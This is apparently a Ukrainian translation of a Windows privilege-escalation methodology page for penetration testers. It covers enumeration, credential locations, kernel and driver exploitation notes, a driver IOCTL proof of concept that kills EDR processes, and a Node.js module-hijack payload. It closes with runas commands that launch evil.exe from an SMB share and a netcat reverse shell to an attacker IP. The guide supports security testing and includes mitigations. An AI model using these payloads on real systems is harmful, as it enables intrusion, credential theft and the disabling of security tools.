Необов’язковий Windows Driver Kit містить `StandaloneRunner.exe`, який може використовувати файли `command.txt`, `reboot.rsf` і файл проєкту `working\rsf.rsf` із каталогу запуску. Заплановане завдання або служба, що запускає цей помічник від імені привілейованого облікового запису, може перетворити доступ на запис для користувача з низькими привілеями до цих файлів на виконання команд у контексті цього облікового запису, навіть якщо виконуваний файл помічника захищений. Переконайтеся, що споживач має привілеї, а **обидва** супровідні файли можна створити або змінити; самого факту виявлення помічника недостатньо.

Для запланованого завдання перевірте його дію [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) та ACL обох шляхів до супровідних файлів. Якщо завдання не вказує робочий каталог, каталог виконуваного файлу — лише зачіпка для перевірки, а не доказ того, звідки завдання читає вхідні файли. Також має виконуватися вимога щодо файлу проєкту. Перевірте фактичний суб’єкт завдання, а не припускайте, що воно запускається від імені SYSTEM.

## Застосунки

### Установлені застосунки

Перевірте **дозволи на бінарні файли** (можливо, один із них можна перезаписати й підвищити привілеї) і **каталоги** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Шлях відновлення Windows agent Checkmk

[CVE-2024-0670](https://checkmk.com/werk/16361) стосується старіших Windows agent Checkmk, які записували файли команд у `C:\Windows\Temp`, а потім виконували вже наявний файл, захищений від запису, якщо заміна не вдавалася. Постачальник виправив проблему у версіях 2.1.0p40, 2.2.0p23, 2.3.0b1 і 2.4.0b1. Перевірте повний рівень встановленого патча та чи може виконуватися вразлива операція agent; позначка лише гілки на кшталт `2.1` не дає змоги встановити, чи є система вразливою. Під час перерахування можна перевірити версію, стан служби та дозволи Temp, не створюючи файлів і не запускаючи команди agent.

#### Перевірка служби SAML в ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) стосувалася збірки ADSelfService Plus 6210 і попередніх версій; постачальник виправив її у збірці 6211. Проблема актуальна лише за умови, що SAML SSO **увімкнено або було увімкнено**. Тому запис про встановлений продукт або шлях до служби — це зачіпка, а не висновок про вразливість: перевірте точну збірку, історію конфігурації SAML, мережеву доступність служби та обліковий запис, від імені якого вона працює. Виконання коду через службу успадковує привілеї цього облікового запису; виконання від імені SYSTEM можливе лише для екземпляра, запущеного від імені SYSTEM. Доступний для читання файл `OfflineBackup_*.ezip` у каталозі Backup продукту — це окрема зачіпка щодо зашифрованої резервної копії, а не доказ наявності придатних до використання облікових даних чи цієї вразливості SAML. Під час звичайного перерахування зафіксуйте його шлях і права доступу, не розпаковуючи файл.

#### Межі контролера Jenkins і доменного облікового запису

На контролері Jenkins під Windows розрізняйте дозвіл створювати або налаштовувати завдання та дозвіл запускати його: [Jenkins описує їх як окремі права `Job/Create`, `Job/Configure` і `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Налаштований розклад або віддалений тригер може забезпечити інший спосіб запуску збірки, але перевірте, чи його ввімкнено та чи збірка справді запускається. Код виконується від імені контролера або вибраного agent, а збережені облікові дані можна використати лише за наявності в завдання доступу до відповідної області дії. Окремо перевірте доступ до метаданих `JENKINS_HOME`: Jenkins зберігає облікові дані та ключі шифрування у `credentials.xml`, `secrets/hudson.util.Secret` і `secrets/master.key` ([зберігання секретів Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Сама їх наявність не розкриває пароль; перевірте **доступ на читання до потрібних файлів** та окремий шлях повторного використання облікового запису, не виводячи секрети у спільний вивід. Якщо цей обліковий запис має право запису в `scriptPath` об’єкта користувача AD, перш ніж вважати це виконанням коду від імені іншого користувача, перевірте доступність шляху для запису та наявність реального входу в систему або запланованого процесу, який використовує цей шлях і працює від імені цільового користувача. Для контролю груп потрібна окрема перевірка фактичних прав AD.

#### Ідентичність self-hosted agent в Azure Pipelines

Для проєкту Azure DevOps Server або Azure Pipelines розрізняйте дозвіл **створювати або редагувати** pipeline, дозвіл **додавати його в чергу** та дозвіл використовувати вибраний пул agent; [Microsoft окремо описує дозволи pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) і [авторизацію пулу](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Якщо обліковий запис із нижчими привілеями може надіслати крок зі скриптом і запустити цей pipeline на self-hosted Windows agent, крок виконується від імені [налаштованого облікового запису операційної системи agent](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Перш ніж стверджувати про перехід до іншого користувача чи SYSTEM, перевірте конкретний pipeline, обмеження гілок і ресурсів, авторизований пул, завдання, яке можна запустити, та ідентичність служби agent. Сам факт наявності agent, ролі в проєкті чи прав на запис у репозиторій — лише зачіпка; під час пасивного перерахування перевіряйте дозволи та локальні метадані служби, не запускаючи збірку.

#### Облікові дані Microsoft Entra Connect Sync

[Microsoft розрізняє](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **обліковий запис служби ADSync**, від імені якого працює служба синхронізації та який має доступ до її бази даних SQL, і **обліковий запис конектора AD DS**, чиї дозволи в каталозі залежать від налаштованих функцій синхронізації. Облікові дані конектора зберігаються в цій базі даних у зашифрованому вигляді, а ключовий матеріал [захищено за допомогою DPAPI від імені облікового запису служби ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Наявність служби синхронізації, групи з назвою, що натякає на права локального адміністратора, чи самого лише доступу до бази даних не доводить, що облікові дані можна розшифрувати або що можливе підвищення привілеїв у домені. Окремо перевірте фактичні права на читання бази даних, доступ до облікового запису служби та ключа, структуру встановлення й SQL, налаштовану ідентичність конектора та фактичні привілеї цієї ідентичності в AD. Під час звичайного перерахування слід показувати лише метадані служби й доступу, а не запитувати чи виводити збережені секрети.

#### Дозволи для DLL підтримки драйвера принтера

Встановлений драйвер принтера може зберігати DLL підтримки в `C:\ProgramData` і завантажувати їх у привілейованому процесі друку. Перевірте ACL точного каталогу драйвера та DLL, включно з батьківськими каталогами й точками повторної обробки, навіть якщо перерахування принтерів через WMI заборонене. Для [проблеми з драйвером принтера Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) вказаний шлях був `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [первинний опис](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) повідомляє про завантаження DLL процесом `PrintIsolationHost.exe`. ACL із дозволом на запис — лише зачіпка: перевірте ефективний доступ на запис з урахуванням записів заборони, чи встановлено відповідний драйвер і чи завантажує він файл із привілейованою ідентичністю, а також чи виправили інсталяцію оновлений драйвер або програма безпеки постачальника. Не робіть висновок про вразливість лише за назвою каталогу або версією драйвера.

### Дозволи на запис

Перевірте, чи можете змінити якийсь файл конфігурації, щоб прочитати спеціальний файл, або змінити виконуваний файл, який запускатиметься від імені облікового запису адміністратора (schedtasks).

Знайти в системі каталоги й файли зі слабкими дозволами можна так:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Автозавантаження плагінів Notepad++ для persistence/виконання

Notepad++ автоматично завантажує будь-які DLL плагінів у підпапках `plugins`. Якщо доступна портативна/копійована інсталяція з правом запису, додавання шкідливого плагіна забезпечує автоматичне виконання коду всередині `notepad++.exe` під час кожного запуску (зокрема з `DllMain` і callback-функцій плагінів).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Запуск під час завантаження

**Перевірте, чи можете ви перезаписати запис реєстру або бінарний файл, який запускатиме інший користувач.**\
**Прочитайте** **цю сторінку**, щоб дізнатися більше про цікаві **розташування autoruns для підвищення привілеїв**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Драйвери

Пошукайте потенційно **дивні/вразливі драйвери сторонніх розробників**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Якщо драйвер надає примітив довільного читання/запису в пам’ять ядра (часто трапляється в погано спроєктованих обробниках IOCTL), можна підвищити привілеї, безпосередньо викравши токен SYSTEM з пам’яті ядра.<sup>[[13]](#references)</sup> Покрокову техніку наведено тут:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Для вразливостей типу race condition, коли вразливий виклик відкриває шлях Object Manager, можна навмисно сповільнити пошук (використовуючи компоненти з максимальною довжиною або глибокі ланцюжки каталогів), розтягнувши вікно з мікросекунд до десятків мікросекунд:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### UAF у cancel-safe чергах, витоки з paged-pool і вектори атаки через I/O ring

Деякі ланцюжки Windows kernel LPE можна побудувати з двох окремо слабких вразливостей: **гонки часу життя cancel-safe черги**, яка звільняє запит/CBD, поки блокування черги ще утримується, і витоку через **звільнення блокування перед копіюванням**, що розкриває звільнену алокацію paged-pool під час `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Нотатки щодо аудиту й експлуатації:

- **Звільнення під блокуванням + скасування після цього**: шукайте шлях успішного виконання, який робить **Acquire -> CompleteRequest/free -> Release**, тоді як шлях скасування робить **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Якщо шлях успішного виконання викликає `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl`, перш ніж звільнити блокування CBDQ/CSQ, потік, заблокований у `NtCancelIoFileEx -> IopCsqCancelRoutine`, може пізніше відновити виконання та передати звільнений `PFLT_CALLBACK_DATA` назад у callback драйвера для видалення.
- **Повторно використайте звільнений об’єкт черги**, виділивши paged-pool пам’ять такого самого розміру під контролем зловмисника. Записи черги даних `NPFS` корисні, оскільки їхній вміст і розмір можна контролювати, а згодом перевіряти за допомогою операцій читання/перегляду каналу. Якщо звільнений об’єкт містить посилання на список, перезапишіть їх **циклічним списком фальшивих вузлів запитів у пам’яті користувача**, щоб драйвер знову й знову обробляв визначені зловмисником структури запитів, а не зупинявся на початковій голові списку.
- **Розширте можливості передбачуваного запису**: якщо фальшивий запит перенаправляє вкладений вказівник контексту, який використовується для записів обліку (мітки часу / QPC / поля поруч із лічильником посилань), можна отримати запис у ядро з **контрольованою адресою, але неконтрольованим значенням**. У такому разі націльтеся на поле **довжини/розміру** об’єкта зі спрею в пулі, а не на кінцевий вказівник на код/дані, а потім переберіть об’єкти спрею, доки пошкоджений об’єкт не забезпечить **читання paged-pool за межами виділеної області**.
- **Шаблон витоку, який можна використати в гонці**: будь-який системний виклик із послідовністю `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` є перспективним кандидатом. Надійність підвищується, якщо зловмисник може збільшити буфер копіювання (наприклад, додавши багато записів списку/ресурсів, які збільшують кінцевий розмір алокації серіалізатора), оскільки довше копіювання розширює вікно для підміни, не обов’язково спричиняючи збій системи.
- **Цілі для повторного заповнення, насичені вказівниками**: масиви зареєстрованих буферів Windows **I/O ring** є чудовими цілями для витоку, оскільки їхній розмір у paged-pool контролюється зловмисником (`8 * regBufferCnt`), а кожен елемент є вказівником ядра на `_IOP_MC_BUFFER_ENTRY`. Злийте один із цих масивів, відновіть розташований поруч `IORING_OBJECT`, а потім пошкодьте **`RegBuffers`** і **`RegBuffersCount`**, щоб наступні операції I/O ring використовували підроблені зловмисником записи й забезпечували довільне читання/запис у пам’ять ядра. Якщо єдиний доступний запис дає стабільний байт (наприклад, з `KUSER_SHARED_DATA+0x14`), використовуйте **перекривні невирівняні записи**, щоб сформувати вказівник користувача з повторюваними байтами, наприклад `0x0101010101010101`, відобразіть його через `VirtualAlloc` і розмістіть там підроблений масив зареєстрованих буферів.<sup>[[30]](#references)</sup>

Корисні ознаки для налагодження:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Щойно отримаєте довільне читання/запис у ядрі через пошкоджений I/O ring, викрадіть SYSTEM token за допомогою стандартного workflow після отримання примітива:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Примітиви пошкодження пам’яті куща реєстру

Сучасні вразливості куща реєстру дають змогу формувати детерміновані розкладки, зловживати доступними для запису нащадками HKLM/HKU та перетворювати пошкодження метаданих на переповнення paged pool ядра без спеціального драйвера. Повний ланцюжок описано тут:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Плутанина типів у режимі direct `RtlQueryRegistryValues` через контрольовані зловмисником шляхи

Деякі драйвери приймають шлях до реєстру з userland, перевіряють лише, що це коректний рядок UTF-16, а потім викликають `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` з `RTL_QUERY_REGISTRY_DIRECT` і передають скалярну змінну зі стека, наприклад `int readValue`. Якщо відсутній `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` інтерпретується відповідно до **фактичного** типу реєстру, а не до типу, на який розраховував розробник.

Це створює два корисні примітиви:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: контрольований користувачем абсолютний шлях `\Registry\...` дає змогу драйверу запитувати вибрані зловмисником ключі, розкривати їхню наявність через коди повернення/журнали, а іноді й читати значення, до яких викликач не мав би прямого доступу.
- **Пошкодження пам’яті ядра**: скалярне призначення, наприклад `&readValue`, може інтерпретуватися помилково як `REG_QWORD`, `UNICODE_STRING` або буфер бінарних даних із заданим розміром — залежно від типу значення реєстру.

Практичні примітки щодо експлуатації:

- **Захист у Windows 8+**: якщо запит звертається до **недовіреного куща** з `RTL_QUERY_REGISTRY_DIRECT`, але без `RTL_QUERY_REGISTRY_TYPECHECK`, виклики з ядра призводять до збою `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Щоб зберегти можливість експлуатації, шукайте **доступні зловмиснику для запису ключі в довірених системних кущах**, а не розміщуйте значення в `HKCU`.
- **Підготовка даних у довіреному кущі**: скористайтеся NtObjectManager, щоб перелічити доступних для запису нащадків `\Registry\Machine`, а потім повторіть сканування з дубльованим токеном **низького рівня цілісності**, щоб знайти ключі, доступні ізольованим контекстам:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: прямий запис 8 байтів у 4-байтовий `int` пошкоджує суміжні дані стека й може частково перезаписати сусідній callback/function pointer.
- **`REG_SZ` / `REG_EXPAND_SZ`**: у direct mode очікується, що `EntryContext` вказує на `UNICODE_STRING`. Якщо код спочатку завантажує контрольований атакувальником `REG_DWORD` у скаляр на стеку, а потім повторно використовує той самий буфер для читання рядка, атакувальник контролює `Length`/`MaximumLength` і частково впливає на pointer `Buffer`, що дає змогу виконати частково контрольований запис у kernel.
- **`REG_BINARY`**: для великих бінарних даних direct mode трактує перший `LONG` за адресою `EntryContext` як знаковий розмір буфера. Якщо попереднє читання `REG_DWORD` залишає від’ємне контрольоване атакувальником значення у повторно використаному скалярі, наступний запит `REG_BINARY` копіює байти атакувальника безпосередньо в сусідні слоти стека. Це часто найпростіший шлях до повного перезапису callback pointer.

Надійний шаблон для пошуку: **різнотипні читання з реєстру в ту саму змінну на стеку без її повторної ініціалізації**. Шукайте `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, повторно використані pointers `EntryContext` і шляхи виконання, у яких перше читання з реєстру визначає, чи відбудеться друге.

#### Зловживання відсутністю FILE_DEVICE_SECURE_OPEN на об’єктах пристроїв (LPE + зупинка EDR)

Деякі підписані сторонні драйвери створюють об’єкт пристрою зі строгим SDDL через IoCreateDeviceSecure, але забувають установити FILE_DEVICE_SECURE_OPEN у DeviceCharacteristics. Без цього прапорця захищений DACL не застосовується, якщо пристрій відкривають через шлях із додатковим компонентом. Тож будь-який непривілейований користувач може отримати handle, використавши шлях у namespace, наприклад:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (з реального випадку)

Отримавши змогу відкрити пристрій, користувач може зловживати привілейованими IOCTL, які надає драйвер, для LPE і втручання в систему. Приклади можливостей, виявлених у реальних випадках:
- Повернення handle з повним доступом до довільних процесів (крадіжка токена / оболонка SYSTEM через DuplicateTokenEx/CreateProcessAsUser).
- Необмежене читання/запис сирих даних на диск (втручання в систему офлайн, трюки зі збереженням доступу під час завантаження).
- Завершення довільних процесів, зокрема Protected Process/Light (PP/PPL), що дає змогу зупиняти AV/EDR із user land через kernel.

Мінімальний шаблон PoC (режим користувача):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mitigations for developers
- Завжди встановлюйте FILE_DEVICE_SECURE_OPEN під час створення об’єктів пристроїв, доступ до яких має обмежуватися DACL.
- Перевіряйте контекст виклику для привілейованих операцій. Додавайте перевірки PP/PPL перед тим, як дозволити завершення процесу або повернення дескрипторів.
- Обмежуйте IOCTL (маски доступу, METHOD_*, перевірка вхідних даних) і розгляньте використання моделей із брокером замість прямих привілеїв ядра.

Ідеї для виявлення загроз
- Відстежуйте відкриття підозрілих імен пристроїв із user-mode (наприклад, \\ .\\amsdk*) і певні послідовності IOCTL, що вказують на зловживання.
- Застосовуйте список заблокованих вразливих драйверів Microsoft (HVCI/WDAC/Smart App Control) і підтримуйте власні списки дозволених і заборонених елементів.


## PATH DLL Hijacking

Якщо у вас є **права на запис у папці, що міститься в PATH**, ви можете перехопити DLL, завантажувану процесом, і **підвищити привілеї**.<sup>[[2]](#references)</sup>

Перевірте дозволи для всіх папок у PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Щоб дізнатися більше про те, як зловживати цією перевіркою:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Перехоплення розв’язання модулів Node.js / Electron через `C:\node_modules`

Це варіант **неконтрольованого пошуку в шляху Windows**, який впливає на застосунки **Node.js** та **Electron**, коли вони виконують імпорт без указання шляху, наприклад `require("foo")`, а очікуваний модуль **відсутній**.<sup>[[20]](#references)</sup>

Node шукає пакети, піднімаючись деревом каталогів і перевіряючи папки `node_modules` у кожному батьківському каталозі. У Windows цей пошук може дійти до кореня диска, тож застосунок, запущений із `C:\Users\Administrator\project\app.js`, може перевірити такі шляхи:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Якщо **користувач із низькими привілеями** може створити `C:\node_modules`, він може розмістити там шкідливий `foo.js` (або папку пакета) і чекати, поки **процес Node/Electron із вищими привілеями** спробує розв’язати відсутню залежність. Payload виконується в контексті безпеки процесу-жертви, тож це стає **LPE**, якщо цільовий процес запущено від імені адміністратора, через підвищене завдання планувальника / обгортку служби або як привілейований застосунок для робочого столу з автозапуском.

Таке трапляється особливо часто, коли:

- залежність указана в `optionalDependencies`<sup>[[22]](#references)</sup>
- стороння бібліотека обгортає `require("foo")` у `try/catch` і продовжує роботу в разі помилки
- пакет видалили зі збірок для production, не включили до пакування або не вдалося встановити
- вразливий виклик `require()` міститься глибоко в дереві залежностей, а не в коді основного застосунку

### Пошук вразливих цілей

Скористайтеся **Procmon**, щоб підтвердити шлях розв’язання:<sup>[[23]](#references)</sup>

- Фільтр `Process Name` = виконуваний файл цілі (`node.exe`, EXE-файл застосунку Electron або процес-обгортка)
- Фільтр `Path` `contains` `node_modules`
- Зверніть увагу на `NAME NOT FOUND` і останнє успішне відкриття файлу в `C:\node_modules`

Корисні шаблони для перевірки коду в розпакованих файлах `.asar` або вихідному коді застосунку:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Визначте **назву відсутнього пакета** за допомогою Procmon або аналізу вихідного коду.
2. Створіть кореневу директорію пошуку, якщо вона ще не існує:

```powershell
mkdir C:\node_modules
```

3. Розмістіть модуль із точно очікуваною назвою:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Запустіть застосунок-жертву. Якщо застосунок виконує `require("foo")`, а легітимний модуль відсутній, Node може завантажити `C:\node_modules\foo.js`.

Реальні приклади відсутніх необов’язкових модулів, які відповідають цьому шаблону, — `bluebird` і `utf-8-validate`, але **техніка** тут універсальна: знайдіть будь-який **відсутній bare import**, який привілейований процес Windows на Node/Electron спробує знайти.

### Ідеї для виявлення та посилення захисту

- Створюйте сповіщення, коли користувач створює `C:\node_modules` або записує туди нові файли чи пакети `.js`.
- Шукайте процеси з високим рівнем цілісності, які читають файли з `C:\node_modules\*`.
- Додавайте всі залежності середовища виконання до виробничого пакета та перевіряйте використання `optionalDependencies`.
- Перевіряйте сторонній код на наявність шаблонів `try { require("...") } catch {}`, які не виводять помилок.
- Вимикайте необов’язкові перевірки, якщо бібліотека це підтримує (наприклад, у деяких розгортаннях `ws` можна уникнути застарілої перевірки `utf-8-validate` за допомогою `WS_NO_UTF_8_VALIDATE=1`).

## Мережа

### Спільні ресурси

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### файл hosts

Перевірте, чи не прописані жорстко у файлі hosts інші відомі комп’ютери.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Мережеві інтерфейси та DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Відкриті порти

Перевірте **обмежені служби** ззовні

```bash
netstat -ano #Opened ports?
```

Для локального прослуховувача зіставте його PID із власником процесу, шляхом до виконуваного файла та службою або запланованим завданням, яке його запускає. Служба віддаленого керування може надати доступ від імені свого користувача робочого столу лише за умови, що це дозволяють її автентифікація та засоби керування командами. Користувацький TCP-застосунок, запущений від імені облікового запису з вищими привілеями, потребує окремої перевірки: прослуховувач і шлях до бінарного файла — це лише пасивні зачіпки, тоді як для підтвердження автентифікації шлях із пошкодженням пам’яті потрібно дослідити саме цей бінарний файл і доступні йому вхідні дані. Якщо здається, що відкритий порт належить системному процесу, перш ніж визначати внутрішню службу, порівняйте його з [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface); саме правило перенаправлення не доводить, що ціль доступна або вразлива.

### Таблиця маршрутизації

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Таблиця ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Правила брандмауера

[**Перевірте цю сторінку, щоб знайти команди для роботи з брандмауером**](../basic-cmd-for-pentesters.md#firewall) **(перегляд правил, створення правил, вимкнення, вимкнення...)**

Більше [команд для переліку мережі тут](../basic-cmd-for-pentesters.md#network)

### Підсистема Windows для Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Бінарний файл `bash.exe` також можна знайти в `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Якщо ви отримаєте права користувача root, зможете прослуховувати будь-який порт (під час першої спроби прослуховувати порт за допомогою `nc.exe` з’явиться графічне вікно із запитом, чи дозволити `nc` працювати через брандмауер).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Щоб легко запустити bash від імені root, можна спробувати `--default-user root`

Файлову систему `WSL` можна переглянути в папці `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Сам по собі Linux `root` у WSL не надає прав адміністратора Windows. Якщо поточний обліковий запис Windows може читати файлову систему дистрибутива, перевірте файли історії команд оболонки (зокрема `/root/.bash_history`) на наявність команд, у яких могли зберегтися облікові дані; для підвищення привілеїв усе одно потрібен дійсний обліковий запис із вищими привілеями та дозволений спосіб автентифікації. Структура `LocalState\rootfs` використовується в старіших інсталяціях WSL; у WSL 2 дистрибутив зазвичай зберігається на [віртуальному диску `ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), тому спершу визначте фактичний дистрибутив і шлях до його сховища. Під час автоматичного перебирання не виводьте вміст історії команд.

## Облікові дані Windows

### Облікові дані Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Treat `DefaultUserName` і `DefaultDomainName` як контекст облікового запису, а не облікові дані. Непорожнє значення `DefaultPassword` або `AltDefaultPassword` — це знахідка з відкритим паролем у реєстрі. Якщо `AutoAdminLogon=1`, але пароль у відкритому вигляді недоступний для читання, це лише зачіпка: [Sysinternals Autologon може зберігати пароль як секрет LSA](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), а звичайне читання реєстру не дає змоги встановити, чи існує цей секрет і чи можна його отримати. Перш ніж повідомляти про розкриття облікових даних, перевірте права доступу та фактичну конфігурацію входу.

### Диспетчер облікових даних / сховище Windows

З [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Сховище Windows зберігає облікові дані для серверів, вебсайтів та інших програм, які **Windows** може використовувати для **автоматичного входу користувачів**. Спочатку може здатися, що користувачі можуть зберігати облікові дані для таких сайтів, як Facebook, Twitter або Gmail, щоб браузери автоматично входили на них, але це працює не так.

Сховище Windows зберігає облікові дані, за допомогою яких Windows може автоматично входити в облікові записи користувачів. Це означає, що будь-яка **програма Windows, якій потрібні облікові дані для доступу до ресурсу** (сервера чи вебсайту), **може використовувати цей Диспетчер облікових даних** і сховище Windows, отримуючи надані облікові дані замість того, щоб щоразу вводити ім’я користувача й пароль.

Якщо програми не взаємодіють із Диспетчером облікових даних, гадаю, вони не зможуть використовувати облікові дані для певного ресурсу. Тож якщо ваша програма хоче скористатися сховищем, вона має якось **зв’язатися з диспетчером облікових даних і запитати облікові дані для цього ресурсу** зі сховища за замовчуванням.

Скористайтеся `cmdkey`, щоб переглянути список збережених на комп’ютері облікових даних.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Тоді можна використовувати `runas` з опцією `/savecred`, щоб скористатися збереженими обліковими даними. У наступному прикладі віддалений виконуваний файл запускається через спільний ресурс SMB.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Використання `runas` із наданими обліковими даними.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

